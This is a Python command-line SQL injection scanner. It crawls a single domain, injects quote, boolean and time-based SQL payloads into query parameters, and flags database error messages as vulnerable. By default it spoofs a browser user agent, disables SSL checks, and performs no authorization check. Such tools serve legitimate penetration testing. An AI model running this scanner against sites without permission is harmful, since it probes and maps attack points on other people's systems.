#!/usr/bin/env python3

import sys
import time
import queue
import threading
import signal
import ssl
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from typing import Dict, List, Set, Tuple, Optional
from dataclasses import dataclass
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import logging

# Third-party imports
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style
import argparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sql_scanner.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

class ScanStatus(Enum):
    VULNERABLE = "VULNERABLE"
    SAFE = "SAFE"
    ERROR = "ERROR"
    PENDING = "PENDING"

@dataclass
class ScanResult:
    url: str
    parameter: str
    payload: str
    status: ScanStatus
    response_code: int
    error_message: Optional[str] = None
    response_time: Optional[float] = None

class DatabaseType(Enum):
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    ORACLE = "Oracle"
    MSSQL = "Microsoft SQL Server"
    GENERIC = "Generic SQL"

class SQLInjectionScanner:
    """
    Main scanner class implementing recursive crawling and SQL injection detection.
    """
    
    ERROR_PATTERNS = {
        DatabaseType.MYSQL: [
            r"You have an error in your SQL syntax",
            r"check the manual that corresponds to your MySQL server version",
            r"supplied argument is not a valid MySQL result resource",
            r"MySQLSyntaxErrorException",
            r"Warning.*?mysqli?",
            r"SQL syntax.*?MySQL"
        ],
        DatabaseType.POSTGRESQL: [
            r"ERROR:\s+syntax error at or near",
            r"PSQLException",
            r"FATAL:\s+invalid value for parameter",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?pg_"
        ],
        DatabaseType.ORACLE: [
            r"ORA-[0-9]{5}",
            r"ORA-01756: quoted string not properly terminated",
            r"ORA-00933: SQL command not properly ended",
            r"SQL command not properly ended",
            r"Oracle error"
        ],
        DatabaseType.MSSQL: [
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
            r"Driver.*?SQL[\-\_\ ]*Server",
            r"OLE DB.*?SQL Server",
            r"Microsoft OLE DB Provider for SQL Server"
        ],
        DatabaseType.GENERIC: [
            r"SQL syntax error",
            r"invalid SQL",
            r"syntax error in SQL statement",
            r"SQL statement failed"
        ]
    }
    
    # SQL injection payloads
    SQLI_PAYLOADS = [
        "'",                    # Single quote - most common
        "\"",                   # Double quote
        "';",                   # Single quote with semicolon
        "\";",                  # Double quote with semicolon
        "' OR '1'='1",          # Boolean-based test
        "\" OR \"1\"=\"1",      # Boolean-based test with double quotes
        "')",                   # Closing parenthesis
        "'))",                  # Double closing parenthesis
        "\\'",                  # Escaped single quote
        "1' AND '1'='1",        # Boolean condition
        "1' AND SLEEP(5)--",    # Time-based (for future enhancement)
    ]
    
    def __init__(
        self,
        domain: str,
        max_depth: int = 10,
        max_threads: int = 10,
        timeout: int = 30,
        user_agent: str = None,
        verify_ssl: bool = False
    ):

        self.domain = domain
        self.base_url = f"http://{domain}" if not domain.startswith(('http://', 'https://')) else domain
        self.max_depth = max_depth
        self.max_threads = max_threads
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        
        # User agent configuration
        self.user_agent = user_agent or (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        )
        
        # Data structures for crawling
        self.visited_urls: Set[str] = set()
        self.urls_to_crawl: queue.Queue = queue.Queue()
        self.crawl_lock = threading.Lock()
        
        # Results storage
        self.scan_results: List[ScanResult] = []
        self.vulnerable_urls: List[Dict] = []
        
        # Statistics
        self.stats = {
            'pages_crawled': 0,
            'pages_scanned': 0,
            'parameters_tested': 0,
            'vulnerabilities_found': 0,
            'errors_encountered': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Initialize HTTP session with retry logic
        self.session = self._create_session()
        
        # Signal handling for graceful shutdown
        self.shutdown_requested = False
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _create_session(self) -> requests.Session:

        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504],
            allowed_methods=["GET", "POST"]
        )
        
        # Mount adapters for HTTP and HTTPS
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,
            pool_maxsize=100
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set default headers
        session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Disable SSL verification if requested
        if not self.verify_ssl:
            session.verify = False
            # Suppress SSL warnings
            requests.packages.urllib3.disable_warnings(
                requests.packages.urllib3.exceptions.InsecureRequestWarning
            )
        
        return session
    
    def _signal_handler(self, signum, frame):
        print(f"\n{Fore.YELLOW}[!] Received interrupt signal. Shutting down gracefully...")
        self.shutdown_requested = True
    
    def _normalize_url(self, url: str, base_url: str) -> Optional[str]:

        try:
            normalized = urljoin(base_url, url)
            
            parsed = urlparse(normalized)
            
            parsed = parsed._replace(fragment="")
            
            normalized = parsed.geturl()
            
            if parsed.scheme not in ('http', 'https'):
                return None
            
            # Enforce domain scope
            if parsed.netloc != urlparse(self.base_url).netloc:
                return None
            
            return normalized
            
        except Exception as e:
            logger.debug(f"Error normalizing URL {url}: {e}")
            return None
    
    def _extract_links(self, html_content: str, base_url: str) -> Set[str]:
      
        links = set()
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Find all anchor tags
            for anchor in soup.find_all('a', href=True):
                href = anchor.get('href', '').strip()
                if href:
                    normalized = self._normalize_url(href, base_url)
                    if normalized:
                        links.add(normalized)
            
            # Also extract links from form actions
            for form in soup.find_all('form', action=True):
                action = form.get('action', '').strip()
                if action:
                    normalized = self._normalize_url(action, base_url)
                    if normalized:
                        links.add(normalized)
            
            # Extract links from iframe src
            for iframe in soup.find_all('iframe', src=True):
                src = iframe.get('src', '').strip()
                if src:
                    normalized = self._normalize_url(src, base_url)
                    if normalized:
                        links.add(normalized)
            
        except Exception as e:
            logger.error(f"Error extracting links: {e}")
        
        return links
    
    def _check_for_sql_errors(self, response_text: str) -> Tuple[bool, Optional[DatabaseType]]:

        import re
        
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                try:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return True, db_type
                except re.error as e:
                    logger.warning(f"Invalid regex pattern {pattern}: {e}")
                    continue
        
        return False, None
    
    def _test_parameter(
        self,
        url: str,
        param_name: str,
        original_value: str
    ) -> List[ScanResult]:

        results = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for payload in self.SQLI_PAYLOADS:
            if self.shutdown_requested:
                break
                
            test_params = query_params.copy()
            test_params[param_name] = [original_value + payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = parsed_url._replace(query=new_query).geturl()
            
            try:
                start_time = time.time()
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                response_time = time.time() - start_time
                
                is_vulnerable, db_type = self._check_for_sql_errors(response.text)
                
                result = ScanResult(
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    status=ScanStatus.VULNERABLE if is_vulnerable else ScanStatus.SAFE,
                    response_code=response.status_code,
                    response_time=response_time
                )
                
                if is_vulnerable:
                    result.error_message = f"Detected {db_type.value} error pattern"
                    with self.crawl_lock:
                        self.vulnerable_urls.append({
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'database': db_type.value,
                            'response_code': response.status_code
                        })
                
                results.append(result)
                
                if is_vulnerable:
                    print(f"{Fore.GREEN}[+] VULNERABLE: {url}")
                    print(f"    Parameter: {param_name}")
                    print(f"    Payload: {payload}")
                    print(f"    Database: {db_type.value}")
                    print(f"    Response Code: {response.status_code}")
                else:
                    print(f"{Fore.RED}[-] SAFE: {url} - Parameter: {param_name}")

                time.sleep(0.1)
                
            except requests.exceptions.Timeout:
                logger.warning(f"Timeout testing {url} with payload {payload}")
                results.append(ScanResult(
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    status=ScanStatus.ERROR,
                    response_code=0,
                    error_message="Request timeout"
                ))
                
            except requests.exceptions.RequestException as e:
                logger.error(f"Error testing {url}: {e}")
                results.append(ScanResult(
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    status=ScanStatus.ERROR,
                    response_code=0,
                    error_message=str(e)
                ))
        
        return results
    
    def _scan_url(self, url: str) -> List[ScanResult]:

        results = []
        
        parsed = urlparse(url)
        
        if not parsed.query:

            return results
        
        query_params = parse_qs(parsed.query)
        
        for param_name, values in query_params.items():
            if not values:
                continue
                
            original_value = values[0] if values else ""
            param_results = self._test_parameter(url, param_name, original_value)
            results.extend(param_results)
            
            with self.crawl_lock:
                self.stats['parameters_tested'] += len(self.SQLI_PAYLOADS)
        
        return results
    
    def _crawl_page(self, url: str, depth: int = 0) -> None:
       
        if self.shutdown_requested or depth > self.max_depth:
            return
        
        with self.crawl_lock:
            if url in self.visited_urls:
                return
            self.visited_urls.add(url)
            self.stats['pages_crawled'] += 1
        
        try:
            print(f"{Fore.CYAN}[*] Crawling: {url} (Depth: {depth})")
            
            response = self.session.get(
                url,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' not in content_type:
                return
            
            if depth < self.max_depth:
                links = self._extract_links(response.text, url)
                
                for link in links:
                    with self.crawl_lock:
                        if link not in self.visited_urls:
                            self.urls_to_crawl.put((link, depth + 1))
            
            if '?' in url:
                with self.crawl_lock:
                    self.stats['pages_scanned'] += 1
                
                scan_results = self._scan_url(url)
                self.scan_results.extend(scan_results)
                
                for result in scan_results:
                    if result.status == ScanStatus.VULNERABLE:
                        with self.crawl_lock:
                            self.stats['vulnerabilities_found'] += 1
        
        except requests.exceptions.RequestException as e:
            with self.crawl_lock:
                self.stats['errors_encountered'] += 1
            logger.error(f"Error crawling {url}: {e}")
        
        except Exception as e:
            with self.crawl_lock:
                self.stats['errors_encountered'] += 1
            logger.error(f"Unexpected error crawling {url}: {e}")
    
    def _crawl_worker(self):

        while not self.shutdown_requested:
            try:
                url, depth = self.urls_to_crawl.get(timeout=1)
                self._crawl_page(url, depth)
                self.urls_to_crawl.task_done()
            except queue.Empty:
                if self.shutdown_requested:
                    break
                continue
            except Exception as e:
                logger.error(f"Error in crawl worker: {e}")
    
    def run(self) -> Dict:

        print(f"{Fore.YELLOW}[*] Starting SQL Injection Scanner")
        print(f"{Fore.YELLOW}[*] Target: {self.domain}")
        print(f"{Fore.YELLOW}[*] Max Depth: {self.max_depth}")
        print(f"{Fore.YELLOW}[*] Max Threads: {self.max_threads}")
        print(f"{Fore.YELLOW}[*] SSL Verification: {'Enabled' if self.verify_ssl else 'Disabled'}")
        print("-" * 80)
        
        self.stats['start_time'] = time.time()
        
        self.urls_to_crawl.put((self.base_url, 0))
        
        threads = []
        for i in range(min(self.max_threads, 20)):  
            thread = threading.Thread(target=self._crawl_worker, daemon=True)
            thread.start()
            threads.append(thread)
        
        try:
            while not self.urls_to_crawl.empty() and not self.shutdown_requested:
                time.sleep(0.5)
                
                with self.crawl_lock:
                    queue_size = self.urls_to_crawl.qsize()
                    visited = len(self.visited_urls)
                    vulns = self.stats['vulnerabilities_found']
                
                if visited % 10 == 0: 
                    print(f"{Fore.CYAN}[*] Progress: {visited} pages crawled, "
                          f"{queue_size} in queue, {vulns} vulnerabilities found")
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user")
        
        self.urls_to_crawl.join()
        
        self.shutdown_requested = True
        for thread in threads:
            thread.join(timeout=5)
        
        self.stats['end_time'] = time.time()
        
        return self._generate_report()
    
    def _generate_report(self) -> Dict:

        scan_duration = self.stats['end_time'] - self.stats['start_time']
        
        report = {
            'target': self.domain,
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'duration_seconds': round(scan_duration, 2),
            'statistics': self.stats,
            'vulnerabilities': self.vulnerable_urls,
            'pages_crawled': list(self.visited_urls)[:100],  # First 100 pages
            'summary': {
                'total_vulnerabilities': self.stats['vulnerabilities_found'],
                'total_pages_crawled': self.stats['pages_crawled'],
                'total_parameters_tested': self.stats['parameters_tested'],
                'success_rate': round((self.stats['pages_crawled'] - self.stats['errors_encountered']) / 
                                    max(self.stats['pages_crawled'], 1) * 100, 2)
            }
        }
        
        # Print summary
        print(f"\n{Fore.YELLOW}{'='*80}")
        print(f"{Fore.GREEN}SCAN COMPLETE")
        print(f"{Fore.YELLOW}{'='*80}")
        print(f"{Fore.CYAN}Scan Duration: {scan_duration:.2f} seconds")
        print(f"{Fore.CYAN}Pages Crawled: {self.stats['pages_crawled']}")
        print(f"{Fore.CYAN}Pages Scanned: {self.stats['pages_scanned']}")
        print(f"{Fore.CYAN}Parameters Tested: {self.stats['parameters_tested']}")
        print(f"{Fore.CYAN}Errors Encountered: {self.stats['errors_encountered']}")
        print(f"{Fore.GREEN if self.stats['vulnerabilities_found'] == 0 else Fore.RED}"
              f"Vulnerabilities Found: {self.stats['vulnerabilities_found']}")
        print(f"{Fore.YELLOW}{'='*80}")
        
        if self.vulnerable_urls:
            print(f"\n{Fore.RED}VULNERABILITIES FOUND:")
            for i, vuln in enumerate(self.vulnerable_urls, 1):
                print(f"\n{i}. URL: {vuln['url']}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Database: {vuln['database']}")
        
        # Save report to file
        report_file = f"scan_report_{self.domain.replace('://', '_').replace('/', '_')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Fore.CYAN}[*] Detailed report saved to: {report_file}")
        
        return report

def main():

    parser = argparse.ArgumentParser(
        description="Advanced SQL Injection Scanner with Recursive Crawling",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -d testphp.vulnweb.com
  %(prog)s -d https://example.com --max-depth 5 --threads 20
  %(prog)s -d example.com --verify-ssl --timeout 60
        """
    )
    
    parser.add_argument(
        '-d', '--domain',
        required=True,
        help='Target domain to scan (e.g., testphp.vulnweb.com)'
    )
    
    parser.add_argument(
        '--max-depth',
        type=int,
        default=10,
        help='Maximum crawl depth (default: 10)'
    )
    
    parser.add_argument(
        '--threads',
        type=int,
        default=10,
        help='Number of concurrent threads (default: 10)'
    )
    
    parser.add_argument(
        '--timeout',
        type=int,
        default=30,
        help='Request timeout in seconds (default: 30)'
    )
    
    parser.add_argument(
        '--verify-ssl',
        action='store_true',
        help='Verify SSL certificates (disabled by default)'
    )
    
    parser.add_argument(
        '--user-agent',
        help='Custom User-Agent string'
    )
    
    parser.add_argument(
        '--log-level',
        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
        default='INFO',
        help='Logging level (default: INFO)'
    )
    
    args = parser.parse_args()
    
    logging.getLogger().setLevel(getattr(logging, args.log_level))
    
    try:

        scanner = SQLInjectionScanner(
            domain=args.domain,
            max_depth=args.max_depth,
            max_threads=args.threads,
            timeout=args.timeout,
            user_agent=args.user_agent,
            verify_ssl=args.verify_ssl
        )
        
        report = scanner.run()
        
        sys.exit(0 if report['summary']['total_vulnerabilities'] == 0 else 1)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan terminated by user")
        sys.exit(130)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
